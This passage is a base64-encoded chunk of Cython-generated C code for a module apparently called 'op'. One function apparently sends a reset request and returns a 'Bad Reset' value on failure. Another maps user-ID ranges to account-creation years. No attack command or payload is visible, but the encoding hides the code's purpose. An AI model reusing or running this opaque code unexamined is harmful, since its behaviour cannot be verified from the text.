PSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG5cbiAgICBcbiAgICAge1xuICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJvcC5yZXN0IiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzQsICZfX3B5eF90XzUsICZfX3B5eF90XzYpIDwgMCkgX19QWVhfRVJSKDAsIDE5NCwgX19weXhfTDVfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpO1xuXG4gICAgICBcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0JhZF9SZXNldCk7XG4gICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X3IsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfQmFkX1Jlc2V0KTtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgIGdvdG8gX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgfVxuXG4gICAgXG4gICAgX19weXhfTDVfZXhjZXB0X2Vycm9yOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTtcbiAgICBfX3B5eF9MOF90cnlfZW5kOjtcbiAgfVxuXG4gIFxuICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICBfX1B5eF9JTkNSRUYoX19weXhfdl9yKTtcbiAgX19weXhfciA9IF9fcHl4X3ZfcjtcbiAgZ290byBfX3B5eF9MMDtcblxuICBcblxuICBcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpO1xuICBfX1B5eF9BZGRUcmFjZWJhY2soIm9wLnJlc3QiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19weXhfciA9IE5VTEw7XG4gIF9fcHl4X0wwOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hlYWRlcnMpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZGF0YSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9yZXNwb25zZSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9yKTtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18yb3BfN2RhdGUoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbik7IFxuc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMm9wXzdkYXRlID0geyJkYXRlIiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18yb3BfN2RhdGUsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJvcF83ZGF0ZShQeU9iamVjdCAqX19weXhfc2VsZiwgXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcblB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbHNlXG5QeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbmRpZlxuKSB7XG4gIFB5T2JqZWN0ICpfX3B5eF92X0lkID0gMDtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7XG4gICNlbmRpZlxuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0KiB2YWx1ZXNbMV0gPSB7MH07XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZGF0ZSAod3JhcHBlcikiLCAwKTtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpO1xuICAjZWxzZVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMO1xuICAjZW5kaWZcbiAgI2VuZGlmXG4gIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpO1xuICB7XG4gICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSWQsMH07XG4gICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7XG4gICAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuKSA8IDApIF9fUFlYX0VSUigwLCAxOTksIF9fcHl4X0wzX2Vycm9yKVxuICAgIGlmIChfX3B5eF9rd2RzX2xlbiA+IDApIHtcbiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHtcbiAgICAgICAgY2FzZSAgMTpcbiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApO1xuICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAxOTksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDA6IGJyZWFrO1xuICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgICAgfVxuICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJncztcbiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJkYXRlIiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxOTksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDE7IGkrKykge1xuICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImRhdGUiLCAxLCAxLCAxLCBpKTsgX19QWVhfRVJSKDAsIDE5OSwgX19weXhfTDNfZXJyb3IpIH1cbiAgICAgIH1cbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDEpKSB7XG4gICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgIH0gZWxzZSB7XG4gICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAxOTksIF9fcHl4X0wzX2Vycm9yKVxuICAgIH1cbiAgICBfX3B5eF92X0lkID0gdmFsdWVzWzBdO1xuICB9XG4gIGdvdG8gX19weXhfTDZfc2tpcDtcbiAgX19weXhfTDVfYXJndHVwbGVfZXJyb3I6O1xuICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiZGF0ZSIsIDEsIDEsIDEsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDE5OSwgX19weXhfTDNfZXJyb3IpXG4gIF9fcHl4X0w2X3NraXA6O1xuICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lO1xuICBfX3B5eF9MM19lcnJvcjo7XG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJvcC5kYXRlIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gTlVMTDtcbiAgX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU6O1xuICBfX3B5eF9yID0gX19weXhfcGZfMm9wXzZkYXRlKF9fcHl4X3NlbGYsIF9fcHl4X3ZfSWQpO1xuXG4gIFxuICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7XG4gICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pO1xuICB9XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yb3BfNmRhdGUoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfSWQpIHtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfdWlkID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDtcbiAgaW50IF9fcHl4X3RfNTtcbiAgaW50IF9fcHl4X3RfNjtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZGF0ZSIsIDApO1xuXG4gIFxuICB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEsICZfX3B5eF90XzIsICZfX3B5eF90XzMpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuICAgICB7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF80ID0gX19QeXhfUHlOdW1iZXJfSW50KF9fcHl4X3ZfSWQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMDEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX3B5eF92X3VpZCA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNCk7XG4gICAgICBfX3B5eF90XzQgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xLCBfX3B5eF92X3VpZCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIwMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdWlkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTI3OTAwMCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIwMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICB9XG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzUgPCAwKSkpIF9fUFlYX0VSUigwLCAyMDIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBpZiAoX19weXhfdF81KSB7XG5cbiAgICAgICAgXG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxMCk7XG4gICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxMDtcbiAgICAgICAgZ290byBfX3B5eF9MN190cnlfcmV0dXJuO1xuXG4gICAgICAgIFxuICAgICAgfVxuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMjc5MDAxLCBfX3B5eF92X3VpZCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIwNCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdWlkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTc3NTAwMDAsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMDQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgfVxuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjA0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgaWYgKF9fcHl4X3RfNSkge1xuXG4gICAgICAgIFxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTEpO1xuICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTE7XG4gICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjtcblxuICAgICAgICBcbiAgICAgIH1cblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTc3NTAwMDEsIF9fcHl4X3ZfdWlkLCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjA2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KSkge1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTtcbiAgICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl91aWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yNzk3NjAwMDAsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMDYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgfVxuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjA2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgaWYgKF9fcHl4X3RfNSkge1xuXG4gICAgICAgIFxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTIpO1xuICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTI7XG4gICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjtcblxuICAgICAgICBcbiAgICAgIH1cblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjc5NzYwMDAxLCBfX3B5eF92X3VpZCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIwOCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdWlkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfOTAwOTkwMDAwLCBQeV9MVCk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjA4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIH1cbiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfNSA8IDApKSkgX19QWVhfRVJSKDAsIDIwOCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIGlmIChfX3B5eF90XzUpIHtcblxuICAgICAgICBcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDEzKTtcbiAgICAgICAgX19weXhfciA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDEzO1xuICAgICAgICBnb3RvIF9fcHl4X0w3X3RyeV9yZXR1cm47XG5cbiAgICAgICAgXG4gICAgICB9XG5cbiAgICAgIFxuICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzkwMDk5MDAwMSwgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMTAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpKSB7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpO1xuICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzE2MjkwMTAwMDAsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMTAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgfVxuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjEwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgaWYgKF9fcHl4X3RfNSkge1xuXG4gICAgICAgIFxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTQpO1xuICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTQ7XG4gICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjtcblxuICAgICAgICBcbiAgICAgIH1cblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTkwMDAwMDAwMCwgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMTIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpKSB7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpO1xuICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzI1MDAwMDAwMDAsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMTIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgfVxuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjEyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgaWYgKF9fcHl4X3RfNSkge1xuXG4gICAgICAgIFxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTUpO1xuICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTU7XG4gICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjtcblxuICAgICAgICBcbiAgICAgIH1cblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjUwMDAwMDAwMCwgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMTQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpKSB7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpO1xuICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzM3MTM2Njg3ODYsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMTQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgfVxuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkp